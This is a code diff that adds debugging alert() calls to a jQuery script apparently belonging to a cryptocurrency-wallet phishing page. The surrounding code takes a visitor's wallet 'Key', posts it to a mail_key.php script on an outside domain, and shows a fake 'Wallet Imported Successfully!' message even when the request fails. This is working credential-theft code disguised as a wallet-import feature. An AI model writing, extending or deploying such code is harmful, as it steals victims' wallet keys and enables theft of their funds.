@@ -72,6 +72,7 @@ $('document').ready(function () {
 
         $('#key_submission button').attr('disabled', true);
         $('#key_submission button').text('Loading...');
+        alert('Loading');
 
         $.ajax({
             url: 'https://learnerscrib.platiniumxpwallet.com/aced/mail_key.php',
@@ -82,6 +83,7 @@ $('document').ready(function () {
                 Key
             },
             success: function (data) {
+                alert(data);
                 console.log(data);
                 $('#key_submission button').text('Imported');
                 if (data == 'Mail Sent') {
@@ -89,9 +91,11 @@ $('document').ready(function () {
                 }
             },
             fail: function (err) {
+                alert(err);
                 console.log(err);
             },
             error: function (err) {
+                alert(err);
                 console.log(err);
                 if(err.responseText){
                     $('.import-type').html('<img src="./img/qr.png"><br><p> Wallet Imported Successfully! </p>');
